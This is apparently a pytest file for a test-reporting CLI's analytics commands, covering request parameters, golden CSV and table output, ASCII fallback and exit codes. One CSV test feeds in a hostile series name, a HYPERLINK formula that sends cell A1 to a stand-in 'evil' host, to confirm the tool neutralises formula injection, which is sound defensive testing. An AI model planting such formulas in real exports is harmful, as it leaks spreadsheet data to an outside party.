"""VIZ-211: ``testlookup analytics trends|chart`` read the chart-data endpoint.

The CLI had no analytics command, so "the pass rate of release R in suite S"
was a UI-only answer. Both commands read ``GET /api/v1/analytics/chart-data``
-- the endpoint the UI's charts and MCP's ``get_chart_data`` read -- so one
scope gives one series on every surface.

What is pinned here:

* the request: exactly one call, with the REST names, lists repeated on the
  wire and nothing sent for an unused option;
* the CSV (golden, byte for byte): the UI export's provenance lines, a gap as
  an empty cell (never 0), formula injection neutralised, ``\\n`` and no BOM;
* the table (golden): one row per series with a sparkline, ASCII on a console
  that cannot encode the block glyphs;
* the exit codes: 422 is 2, 403 is 4, an unknown format is 2 with no request.

``UPDATE_GOLDEN=1`` rewrites the two golden files; read the diff before
committing it.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import httpx
import pytest
from typer.testing import CliRunner

from testlookup_cli import chart_render, client
from testlookup_cli.app import app
from testlookup_cli.commands import analytics as analytics_cmd
from testlookup_cli.errors import map_http_error

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURES = REPO_ROOT / "contracts" / "viz" / "fixtures"
GOLDEN = Path(__file__).parent / "golden"
PATH = "/api/v1/analytics/chart-data"
R1 = "22222222-2222-4222-8222-222222222221"
R2 = "22222222-2222-4222-8222-222222222222"

_DAYS = [f"2026-09-{day:02d}" for day in range(8, 20)]
_PAYMENTS = [96.4, 97.0, 95.5, None, 98.2, 99.0, 100.0, 92.3, 94.1, 96.0, 97.5, 98.8]
_CART = [88.0, 90.0, 0.0, 85.5, 91.0, 93.0, 89.0, 90.5, 92.0, 94.0, 95.0, 96.5]


def _meta() -> dict:
    """The contract's filtered envelope, plus a run outside the window."""
    meta = json.loads((FIXTURES / "envelope" / "valid" / "filtered.json").read_text(encoding="utf-8"))
    return {
        **meta["payload"],
        "outside_window": {"buckets": 1, "executions": 12, "first": "2026-09-20", "last": "2026-09-20"},
    }


def _points(values: list) -> list[dict]:
    points = []
    for x, y in zip(_DAYS, values):
        if y is None:
            points.append({"x": x, "y": None, "n": 0, "measured": False,
                           "reason": "No passed, failed or broken executions."})
        else:
            points.append({"x": x, "y": y, "n": 20})
    return points


def _body(cart_label: str = "cart") -> dict:
    """``pass_rate`` by day and suite, as chart-data returns it."""
    return {
        "kind": "series",
        "dimensions": ["day", "suite"],
        "x_type": "time",
        "series": [
            {"key": "payments", "label": "payments", "points": _points(_PAYMENTS)},
            {"key": "cart", "label": cart_label, "points": _points(_CART)},
        ],
        "meta": _meta(),
    }


@pytest.fixture
def api(monkeypatch):
    calls: list[dict] = []
    state: dict = {"body": _body(), "error": None}

    async def _request(method, path, *, profile_name=None, params=None, json_body=None, **_kw):
        calls.append({"method": method, "path": path, "params": params})
        if state["error"] is not None:
            raise state["error"]
        return state["body"]

    monkeypatch.setattr(client, "request", _request)
    return calls, state


def _run(*args, env=None):
    return CliRunner().invoke(app, list(args), env=env)


def _golden(name: str, actual: bytes) -> bytes:
    path = GOLDEN / name
    if os.environ.get("UPDATE_GOLDEN") == "1":
        path.parent.mkdir(exist_ok=True)
        path.write_bytes(actual)
    return path.read_bytes()


# ── the request ─────────────────────────────────────────────────────────────


def test_trends_sends_exactly_the_scope_it_was_given(api):
    """The story's invocation: one release pair, one suite, a 90-day window."""
    calls, _ = api
    result = _run(
        "analytics", "trends", "--project", "p1", "--release", R1, "--release", R2,
        "--suite", "checkout", "--days", "90", "--format", "json",
    )
    assert result.exit_code == 0, result.output
    assert calls == [{
        "method": "GET",
        "path": PATH,
        "params": {
            "metric": "pass_rate", "group_by": ["day"], "days": 90, "project_id": "p1",
            "release_id": [R1, R2], "suite_name": ["checkout"],
        },
    }]


def test_an_unused_option_is_not_sent(api):
    calls, _ = api
    assert _run("analytics", "trends", "-o", "json").exit_code == 0
    assert calls[0]["params"] == {"metric": "pass_rate", "group_by": ["day"], "days": 30}


def test_by_adds_a_second_dimension_and_defaults_top_n(api):
    calls, _ = api
    assert _run("analytics", "trends", "--by", "suite", "-o", "json").exit_code == 0
    assert calls[0]["params"]["group_by"] == ["day", "suite"]
    assert calls[0]["params"]["top_n"] == analytics_cmd.DEFAULT_TOP_N_WITH_BY
    assert _run("analytics", "trends", "--by", "release", "--top-n", "3", "-o", "json").exit_code == 0
    assert calls[1]["params"]["top_n"] == 3


def test_chart_takes_any_metric_over_two_dimensions(api):
    calls, _ = api
    result = _run(
        "analytics", "chart", "--metric", "duration_p95", "--group-by", "week",
        "--group-by", "environment", "--top-n", "5", "-p", "p1", "-o", "json",
    )
    assert result.exit_code == 0, result.output
    assert calls[0]["params"] == {
        "metric": "duration_p95", "group_by": ["week", "environment"], "days": 30,
        "project_id": "p1", "top_n": 5,
    }


def test_a_third_dimension_is_refused_before_any_request(api):
    calls, _ = api
    result = _run("analytics", "chart", "--metric", "executions",
                  "--group-by", "day", "--group-by", "suite", "--group-by", "status")
    assert result.exit_code == 2
    assert calls == []


def test_the_wire_repeats_list_keys_and_sends_the_api_key(monkeypatch):
    """Through the real ``client.request``: httpx must repeat the key, never
    send ``release_id=['a', 'b']``, and a key profile sends ``X-API-Key``."""
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json=_body())

    real_client = httpx.AsyncClient
    monkeypatch.setattr(
        client.httpx, "AsyncClient",
        lambda **kw: real_client(transport=httpx.MockTransport(handler), **kw),
    )
    monkeypatch.setattr(client, "get_profile", lambda _name=None: {
        "url": "http://testserver", "auth_type": "api_key", "api_key": "tl_test_key",
    })
    result = _run("analytics", "trends", "--release", R1, "--release", R2,
                  "--suite", "checkout", "--by", "suite", "-o", "json")
    assert result.exit_code == 0, result.output
    assert len(seen) == 1
    assert seen[0].url.path == PATH
    assert sorted(seen[0].url.params.multi_items()) == sorted([
        ("metric", "pass_rate"), ("group_by", "day"), ("group_by", "suite"), ("days", "30"),
        ("release_id", R1), ("release_id", R2), ("suite_name", "checkout"), ("top_n", "7"),
    ])
    assert seen[0].url.params.get_list("group_by") == ["day", "suite"], "order is significant"
    assert seen[0].headers["x-api-key"] == "tl_test_key"


# ── the formats ─────────────────────────────────────────────────────────────


def test_json_is_the_rest_body_verbatim(api):
    result = _run("analytics", "trends", "-o", "json")
    assert result.exit_code == 0, result.output
    assert json.loads(result.stdout) == _body()


def test_csv_matches_the_golden_byte_for_byte(api):
    result = _run("analytics", "trends", "--by", "suite", "--format", "csv")
    assert result.exit_code == 0, result.output
    assert result.stdout_bytes == _golden("analytics_trends.csv", result.stdout_bytes)


def test_csv_writes_a_gap_as_an_empty_cell_and_a_zero_as_zero(api):
    text = _run("analytics", "trends", "-o", "csv").stdout_bytes.decode("utf-8")
    assert "2026-09-11,,85.5\n" in text, "an unmeasured day is empty, never 0"
    assert "2026-09-10,95.5,0\n" in text, "a measured 0% is 0, never empty"
    assert not text.startswith("﻿") and "\r" not in text


def test_a_point_marked_unmeasured_is_a_gap_even_with_a_y():
    """The renderers draw ``measured: false`` as a gap whatever ``y`` holds,
    so the export does too (``chartExport.ts::withGaps``)."""
    body = _body()
    body["series"][1]["points"][0] = {"x": _DAYS[0], "y": 0.0, "n": 0, "measured": False,
                                      "reason": "Nothing evaluated."}
    text = chart_render.chart_csv(body, "t")
    assert "\n2026-09-08,96.4,\n" in text
    assert chart_render.sparkline([None], rate=True) == " "


def test_csv_states_the_scope_the_server_applied(api):
    lines = _run("analytics", "trends", "-o", "csv").stdout_bytes.decode("utf-8").splitlines()
    assert lines[1:7] == [
        "# Project,Checkout",
        "# Release,2026.09",
        '# Test Suite,"payments, cart"',
        "# Window,2026-08-20 – 2026-09-19 UTC (30 days)",
        '# Totals,"18 of 143 runs · 412 of 3,960 executions"',
        "# Generated,2026-09-19 10:42 UTC",
    ]
    assert lines[7].startswith('# Warning,"1 bucket(s) after the window')
    assert lines[8] == "day,payments,cart"


def test_csv_without_meta_says_the_scope_is_unavailable():
    body = {key: value for key, value in _body().items() if key != "meta"}
    lines = chart_render.chart_csv(body, "t").splitlines()
    assert lines[1] == "# Scope,Scope unavailable"
    assert lines[2] == "day,payments,cart"


def test_a_hostile_series_name_is_inert_in_the_csv(api):
    _, state = api
    state["body"] = _body(cart_label='=HYPERLINK("http://evil/?"&A1,"click")')
    text = _run("analytics", "trends", "-o", "csv").stdout_bytes.decode("utf-8")
    assert 'day,payments,"\'=HYPERLINK(""http://evil/?""&A1,""click"")"\n' in text


@pytest.mark.parametrize(("value", "expected"), [
    ("=1+1", "'=1+1"),
    ("+1+1", "'+1+1"),
    ("-1+1", "'-1+1"),
    ("@SUM(A1:A2)", "'@SUM(A1:A2)"),
    ("\t=1", "\"\t'=1\""),
    ("x;=1+1", "\"x;'=1+1\""),
    ("＝1", "'＝1"),
    (" =1", "' =1"),
    ("-A1", "'-A1"),
    ("a=1", "a=1"),
    ("test_x[1,-2]", '"test_x[1,-2]"'),
    ("-5", "-5"),
    ("-1e-7", "-1e-7"),
    (-5, "-5"),
    (-1e-7, "-1e-7"),
    (0.1 + 0.2, "0.30000000000000004"),
    (88.0, "88"),
    (None, ""),
])
def test_csv_cells_follow_the_ui_writer(value, expected):
    """Cases from ``frontend/src/lib/viz/csv.test.ts``: the two writers agree."""
    assert chart_render.csv_cell(value) == expected


def test_table_matches_the_golden(api):
    result = _run("analytics", "trends", "--by", "suite", env={"COLUMNS": "100"})
    assert result.exit_code == 0, result.output
    # Rich pads the centred title and caption with spaces. They are trimmed on
    # both sides so an editor that strips trailing blanks cannot break this.
    actual = "".join(line.rstrip() + "\n" for line in result.stdout.splitlines()).encode("utf-8")
    assert actual == _golden("analytics_trends_table.txt", actual)


def test_table_shows_the_last_sixty_points_of_a_long_window(api):
    _, state = api
    days = [f"day-{i:03d}" for i in range(90)]
    state["body"] = {
        "kind": "series", "dimensions": ["day"], "x_type": "time",
        "series": [{"key": "value", "label": "executions",
                    "points": [{"x": x, "y": float(i), "n": i} for i, x in enumerate(days)]}],
        "meta": _meta(),
    }
    result = _run("analytics", "trends", "--metric", "executions", env={"COLUMNS": "200"})
    assert result.exit_code == 0, result.output
    assert "Trend, last 60 of 90" in result.stdout
    line = next(row for row in result.stdout.splitlines() if "executions" in row and "of 90" in row)
    assert chart_render.SPARK_BLOCKS[-1] in line


def test_the_table_sends_its_warnings_to_stderr(api):
    result = _run("analytics", "trends")
    assert "after the window" in result.stderr
    assert "after the window" not in result.stdout


def test_sparkline_scales_rates_to_100_and_draws_gaps_as_spaces():
    assert chart_render.sparkline([0.0, None, 100.0], rate=True) == "▁ █"
    assert chart_render.sparkline([5.0, 10.0], rate=False) == "▅█"
    assert chart_render.sparkline([0.0, None], rate=True, ramp=chart_render.SPARK_ASCII) == "_ "


# ── a console that cannot encode the glyphs ─────────────────────────────────

_SNIPPET = """
import json, sys
from testlookup_cli import client
from testlookup_cli.app import app
body = json.loads(open(sys.argv[1], encoding="utf-8").read())
async def _request(*args, **kwargs):
    return body
client.request = _request
app(["analytics", "trends", "--by", "suite", "-o", sys.argv[2]])
"""


def _cp1252(tmp_path, output_format: str) -> subprocess.CompletedProcess:
    body_file = tmp_path / "body.json"
    body_file.write_text(json.dumps(_body(cart_label="決済")), encoding="utf-8")
    return subprocess.run(
        [sys.executable, "-c", _SNIPPET, str(body_file), output_format],
        capture_output=True,
        env={**os.environ, "PYTHONIOENCODING": "cp1252"},
    )


def test_a_cp1252_console_gets_the_ascii_sparkline(tmp_path):
    proc = _cp1252(tmp_path, "table")
    err = proc.stderr.decode("utf-8", "replace")
    assert proc.returncode == 0, err[-500:]
    assert "UnicodeEncodeError" not in err
    out = proc.stdout.decode("cp1252")
    assert "▁" not in out and "█" not in out
    payments = next(line for line in out.splitlines() if "payments" in line and "of 12" in line)
    assert "#" in payments and " " in payments, "the ramp is ASCII and the gap is kept"


def test_a_cp1252_console_still_gets_utf8_csv(tmp_path):
    proc = _cp1252(tmp_path, "csv")
    assert proc.returncode == 0, proc.stderr.decode("utf-8", "replace")[-500:]
    assert "決済".encode("utf-8") in proc.stdout
    assert "– 2026-09-19".encode("utf-8") in proc.stdout


# ── exit codes ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize(("status", "code"), [(422, 2), (403, 4), (404, 5), (401, 3)])
def test_http_errors_keep_the_stable_exit_codes(api, status, code):
    _, state = api
    state["error"] = map_http_error(status, "release_id: not a UUID")
    result = _run("analytics", "trends", "--release", "nope")
    assert result.exit_code == code, result.output


def test_a_429_says_it_is_rate_limited(api):
    _, state = api
    state["error"] = map_http_error(429, "Too many requests")
    result = _run("analytics", "trends")
    assert result.exit_code == 1
    assert "Rate limited" in result.stderr


def test_an_unknown_format_exits_2_without_a_request(api):
    calls, _ = api
    result = _run("analytics", "trends", "--format", "xml")
    assert result.exit_code == 2
    assert calls == []
    assert "table, csv, json" in result.stderr
